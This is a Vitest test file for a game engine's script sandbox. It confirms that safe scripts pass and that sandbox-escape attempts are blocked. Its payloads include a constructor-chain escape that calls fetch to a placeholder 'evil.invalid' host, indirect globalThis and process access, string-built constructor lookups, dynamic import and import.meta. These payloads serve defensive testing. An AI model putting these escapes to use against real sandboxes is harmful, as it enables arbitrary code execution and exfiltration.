import { describe, expect, it } from 'vitest';
import { assertSafeScriptContent } from '@/engine/gameplay/script-sandbox';

describe('Script sandbox AST allowlist', () => {
  it('allows safe runtime script', () => {
    const safeScript = `
export function update(ctx: { deltaTime: number }) {
  const speed = 2;
  const next = speed * ctx.deltaTime;
  console.log(next);
}
`;

    expect(() => assertSafeScriptContent('safe-script.ts', safeScript)).not.toThrow();
  });

  it('blocks constructor-chain sandbox escape', () => {
    const payload = `
export function update() {
  const g = [].filter.constructor('return this')();
  g['fetch']('https://evil.invalid');
}
`;

    expect(() => assertSafeScriptContent('escape-script.ts', payload)).toThrow(
      /dangerous member access|blocked in sandbox/i
    );
  });

  it('blocks blocked globals even when accessed indirectly', () => {
    const payload = `
export function update() {
  const x = globalThis['process'];
  return x;
}
`;

    expect(() => assertSafeScriptContent('globals-script.ts', payload)).toThrow(
      /identifier "globalThis"|dangerous member access/i
    );
  });

  it('blocks dynamic element access used for sandbox evasion', () => {
    const payload = `
export function update() {
  const key = 'con' + 'structor';
  return ([] as unknown as Record<string, unknown>)[key];
}
`;

    expect(() => assertSafeScriptContent('dynamic-access.ts', payload)).toThrow(
      /dynamic element access/i
    );
  });

  it('allows numeric index element access', () => {
    const payload = `
export function update() {
  const values = [10, 20, 30];
  return values[0];
}
`;

    expect(() => assertSafeScriptContent('numeric-index.ts', payload)).not.toThrow();
  });

  it('blocks optional-chaining constructor access', () => {
    const payload = `
export function update() {
  return ([] as unknown as { filter?: { constructor?: unknown } }).filter?.constructor;
}
`;

    expect(() => assertSafeScriptContent('optional-chain.ts', payload)).toThrow(
      /dangerous member access/i
    );
  });

  it('blocks dynamic import calls', () => {
    const payload = `
export async function update() {
  return import('./evil');
}
`;

    expect(() => assertSafeScriptContent('dynamic-import.ts', payload)).toThrow(
      /dynamic import/i
    );
  });

  it('blocks import.meta access', () => {
    const payload = `
export function update() {
  return import.meta.url;
}
`;

    expect(() => assertSafeScriptContent('import-meta.ts', payload)).toThrow(
      /import\.meta/i
    );
  });
});
